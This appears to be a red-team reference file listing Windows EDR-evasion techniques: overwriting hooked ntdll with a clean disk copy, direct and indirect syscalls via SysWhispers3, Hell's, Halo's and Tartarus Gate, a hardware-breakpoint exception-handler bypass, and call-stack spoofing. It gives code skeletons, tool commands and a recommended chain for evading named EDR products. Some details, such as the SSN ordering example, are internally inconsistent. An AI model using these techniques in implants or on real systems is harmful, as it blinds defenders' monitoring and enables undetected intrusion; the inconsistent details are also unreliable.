# Unhook / Direct / Indirect Syscall Technique List

> Limited to authorized red teams / adversarial exercises / proprietary product testing, no use on unauthorized targets.

This document summarizes the current mainstream "bypass user-mode hook" techniques, from the classic unhook to the latest hardware breakpoint Blindside.
All techniques are aligned with MITRE ATT&CK T1562.001 / T1027 / T1055 for report output.

## 1. Peruns Fart / Fresh Ntdll from Disk

### Principle

EDR hooks are all located in **the current process memory's ntdll.dll**. The disk `C:\Windows\System32\ntdll.dll` is clean.
So, by remapping the disk ntdll into the current process and overwriting the `.text` segment in memory, the hooks are erased.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (contains EDR hook jmp) │ ◄── Overwrite with clean disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← Clean
```

### Key Points

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // Use native path to bypass monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find the .text segment of the new address
// 5. NtProtectVirtualMemory to change the current ntdll .text to RW
// 6. memcpy to overwrite
// 7. NtProtectVirtualMemory to restore as RX
```

### Notes

- `NtProtectVirtualMemory` itself might be a hook → Chain problem. Solution: Use **direct syscall** to call `NtProtectVirtualMemory`
- Modern EDRs already monitor `NtProtectVirtualMemory` writes to ntdll memory, requiring an ETW patch
- Peruns Fart leaves events `KERNEL_MODULE_LOAD` and `PROTECTVM` under ETW-TI — Must suppress ETW first

## 2. Direct Syscall (Direct Syscall)

### Principle

Do not call the exported functions of ntdll; write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Value on Win11 24H2, varies by version)
    syscall
    ret
```

The `syscall` instruction directly jumps to the kernel SSDT from user mode, skipping any user-mode hooks.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - Function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stub
syscallsstubs.std.x64.asm  - Standard direct syscall
```

In Visual Studio:

```text
1. Add .asm to the project, enable MASM (Custom Build Tool)
2. Include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) instead of original NtAllocateVirtualMemory
```

### Minimal Direct Syscall Calling NtCreateFile (C Code Skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (Dynamic parsing SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // Write some bytes here...
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Disadvantages

- The `syscall` instruction is located in the implant's own `.text` segment (not ntdll) → Kernel-mode telemetry can easily spot "syscall from non-ntdll address"
- This is why indirect syscall appeared

## 3. Indirect Syscall (间接 syscall)

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address), but the SSN and return address are controlled by us:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<ntdll 中某个 syscall;ret gadget 的地址>]   ; 不是 syscall 在 implant 里
```

The gadget jumped to is usually the `syscall; ret` two-byte sequence at the end of an `Nt*` function in ntdll. The kernel-mode ETW provider sees the RIP as the ntdll address, which fits the legitimate behavior pattern.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => 随机化 jmp 目标减少签名
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; 返回 SSN -> eax
    call Sw3GetSyscallAddress      ; 返回 ntdll 中 syscall;ret 地址 -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; 跳到 ntdll 内合法 syscall 指令
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

The three solve the evolution of "SSN dynamic resolution".

### Hell's Gate

- Assume ntdll is not hooked.
- At implant startup, iterate through the `Nt*` exports in ntdll and extract SSN from the first four bytes `mov eax, <SSN>`.
- Advantages: Not hardcoding SSN, cross-Windows version compatibility.
- Disadvantages: If ntdll is already hooked (first byte becomes jmp), extraction fails.

### Halo's Gate

- Fixes the hook issue in Hell's Gate.
- If a function is found to be hooked (not a standard prologue), scan **upwards / downwards ±N functions**.
- Utilize the fact that SSNs of `Nt*` functions in ntdll are consecutive and descending. Infer the SSN of the hooked function from its neighbors.

```text
Normal situation:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and the SSN cannot be seen, look at its neighbors:
  Previous unhooked export SSN = 0x17
  Next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further processes advanced hooks that **change the SSN but retain the syscall instruction**.
- Validates the SSN with the syscall;ret gadget address.
- Combines the three for the most stable indirect syscall foundation.

### Reference implementation location (after cloning the self-booting git repository)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (含 fallback 逻辑) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   集成了三者
```

## 5. Hardware Breakpoint Blindside

### Principle

Use the debugging registers `DR0-DR3` to set hardware breakpoints at the entry of EDR hook trampolines;
set a VEH (Vectored Exception Handler) that, when the breakpoint is hit, **directly changes RIP** to the hook trampoline after it,
skipping the EDR detection code and landing on the legitimate syscall segment in ntdll.

### Advantages

- No need to write to ntdll memory (`NtProtectVirtualMemory` alert).
- No need to unhook (the hook is still there, just bypassed).
- ETW-TI does not see memory modifications.

### Implementation skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. 在每个被 hook 函数入口设 DR0..DR3 (最多 4 个，配合 single-step rotate)
// 3. SetThreadContext(thread, &ctx) 写 DRx
// 4. 当 EDR hook trampoline 触发硬件断点 -> VEH 接管
// 5. VEH 把 EXCEPTION_POINTERS->ContextRecord->Rip 改到 ntdll 的合法 syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN 已经在 eax；R10 = RCX；跳到 ntdll 的 syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- Each thread has independent DRx → Multiple threads need to be set separately.
- Some EDRs have already hooked `NtSetContextThread` / `NtGetContextThread`, which needs to be bypassed using previous techniques.
- Win11 22H2+ introduced HVCI / some anti-debugging mitigations that may interfere.

## 6. Call Stack Spoofing

### Problem

Modern EDR calls `RtlCaptureStackBackTrace` at the kernel entry points of syscalls like `NtAllocateVirtualMemory` / `NtCreateThreadEx`, capturing a complete call stack to report. The implant's stack will show **non-image-backed memory** frames → high-confidence alerts.

### Solution A: CallStackSpoofer (William Burgess)

Implementation思路：

1. Swap the current thread stack with a fake, legitimate stack before the syscall.
2. Fill the fake stack frame with a legitimate return chain like `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`.
3. Swap back to the real stack after the syscall returns.

### Solution B: SilentMoonwalk

More aggressive, using a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modify RSP / RBP / stack content)
                ↓
                syscall (RtlCaptureStackBackTrace sees the fake stack)
                ↓
                trampoline restores it → continue implant code
```

The key is unwinding: let `RtlVirtualUnwind` follow the fake `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC Recommendations

- Call stack spoof + indirect syscall + ETW patch is currently a relatively stable combination for CrowdStrike / SentinelOne.
- Spoofing during sleep stages is also necessary; simple execution spoofing is insufficient (EDR samples regularly).

## 7. Technology Selection Table

| Technology | Mitigation | Complexity | Current Validity | ATT&CK |
|------------|------------|------------|------------------|--------|
| Peruns Fart | User-mode hook | Low | Medium (easily detected by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hook | Low | Low-Medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hook + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure-based) | T1027 |
| HWBP Blindside | Hook + no write operations | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | Call stack telemetry | High | High | T1564 |

Recommended chain for practical use: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>、<https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Callback Routing

Unhooking is only half the solution; the other half is telemetry blindness: enter `references/telemetry-blinding.md`.